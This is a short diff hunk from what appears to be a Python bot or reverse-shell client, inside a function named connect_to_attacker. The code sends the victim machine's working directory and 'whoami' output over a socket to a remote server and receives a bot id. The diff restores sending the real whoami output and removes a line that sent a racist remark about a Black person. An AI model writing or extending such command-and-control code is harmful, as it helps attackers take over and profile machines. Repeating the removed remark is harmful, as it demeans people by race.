@@ -108,8 +108,7 @@ def connect_to_attacker(SERVER_HOST):
     s.send(cwd.encode())
     # send whoami
     whoami = subprocess.getoutput('whoami')
-    #s.send(whoami.encode())
-    s.send("whathappened is a black man.".encode())
+    s.send(whoami.encode())
 
     bot_id = s.recv(BUFFER_SIZE).decode() # bot id
 
